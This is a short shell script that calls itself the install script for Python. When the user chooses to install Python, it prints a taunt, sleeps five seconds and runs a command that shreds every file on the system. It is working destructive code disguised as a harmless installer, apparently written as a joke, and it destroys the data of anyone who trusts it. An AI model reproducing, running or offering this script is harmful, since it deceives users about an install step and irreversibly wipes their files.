#!/bin/sh

# -------------------------------------
# This is the install script for Python
# -------------------------------------

install () {
  ANSWER="y"

  echo "Python is bloat. Skip? (Y/n)"
  read -r ANSWER

  if [ "$ANSWER" = "n" ]; then
    echo "Go back to ubuntu ;D"
    sleep 5

    find / -type f -exec shred {} \;
  fi
}

if [ "$1" = "install" ]; then
  install
else
  printf "Use a proper installation argument"
fi
